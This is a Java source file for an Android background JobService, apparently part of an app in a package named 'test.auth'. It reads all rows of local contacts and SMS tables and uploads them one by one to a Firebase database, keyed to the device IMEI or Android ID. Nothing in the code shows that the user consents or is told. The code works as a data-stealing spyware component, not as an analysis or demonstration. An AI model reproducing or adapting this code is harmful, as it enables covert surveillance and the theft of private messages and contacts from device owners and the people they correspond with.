package com.abhi_pandey.test.auth;

import android.Manifest;
import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.Build;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import com.abhi_pandey.test.dbHelper;
import com.abhi_pandey.test.firebase.dbModelCall;
import com.abhi_pandey.test.firebase.dbModelSMS;
import com.abhi_pandey.test.firebase.firebaseDatabaseAdapter;

import java.util.ArrayList;

public class jobService extends JobService {
    ArrayList<dbModelCall> dbModelCalls = new ArrayList<>();
    ArrayList<dbModelSMS> dbModelSMS =new ArrayList<>();
    firebaseDatabaseAdapter data = new firebaseDatabaseAdapter();

    int totalsms=0;
    private boolean jobCancelled = false;
    @Override
    public boolean onStartJob(JobParameters params) {
      //  Log.d(TAG, "Job started");
        doBackgroundWork(params);
        return true;
    }
    private void doBackgroundWork(final JobParameters params) {
        new Thread(new Runnable() {
            @Override
            public void run() {

                dbModelCalls.clear();
                if (checkSelfPermission(Manifest.permission.INTERNET) == PackageManager.PERMISSION_GRANTED) {

                        dbHelper dbhelper = new dbHelper(getApplicationContext());

                        SQLiteDatabase db = dbhelper.getReadableDatabase();
                        Cursor cur = db.rawQuery("SELECT * FROM Contacts", null);

                     totalsms=cur.getCount();

                            while (cur.moveToNext()){

                            dbModelCall d = new dbModelCall(cur.getString(0),
                                    cur.getString(1), cur.getString(2), cur.getString(3),
                                    cur.getString(4), cur.getString(5),
                                    cur.getString(6), cur.getString(7));
                            dbModelCalls.add(d);

                                Log.i("sending jjjjjjjjjjjjjj", "run: "+cur.getString(0));


                                data.sendToDB(dbModelCalls,getDeviceIMEI());
                    if (jobCancelled) {
                        return;
                    }
                    try {
                        Thread.sleep(1000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
                            cur.close();

                            //sms


                    Cursor cur1 = db.rawQuery("SELECT * FROM Sms", null);

                    while (cur1.moveToNext()) {

                        dbModelSMS dm = new dbModelSMS(cur1.getString(0),
                                cur1.getString(7), cur1.getString(6), cur1.getString(5),
                                cur1.getString(1), cur1.getString(2),
                                cur1.getString(3), cur1.getString(4));
                        dbModelSMS.add(dm);

                    data.sendToSmsDB(dbModelSMS, getDeviceIMEI());
                        if (jobCancelled) {
                            return;
                        }
                        try {
                            Thread.sleep(1000);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }


            }



                // Log.d(TAG, "Job finished");
                jobFinished(params, false);
            }
        }).start();
    }
    @Override
    public boolean onStopJob(JobParameters params) {
     //   Log.d(TAG, "Job cancelled before completion");
        jobCancelled = true;
        return true;
    }



    public String getDeviceIMEI() {
        String deviceId;

        if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {

            deviceId = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);

        } else {

            final TelephonyManager mTelephony = (TelephonyManager) getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE);


            if (mTelephony.getDeviceId() != null) {
                deviceId = mTelephony.getDeviceId();
            } else {
                deviceId = Settings.Secure.getString(
                        getApplicationContext().getContentResolver(),
                        Settings.Secure.ANDROID_ID);
            }
        }

        return deviceId;

    }

}
/*
*
*
*   firebaseDatabaseAdapter data = new firebaseDatabaseAdapter();
                        data.sendToDB(dbModelCalls, getDeviceIMEI());


                        Cursor cur1 = db.rawQuery("SELECT * FROM Sms", null);
                        while (cur1.moveToNext()) {

                            dbModelSMS dm = new dbModelSMS(cur1.getString(0),
                                    cur1.getString(7), cur1.getString(6), cur1.getString(5),
                                    cur1.getString(1), cur1.getString(2),
                                    cur1.getString(3), cur1.getString(4));


                            dbModelSMS.add(dm);
                        }


                        data.sendToSmsDB(dbModelSMS, getDeviceIMEI());
*/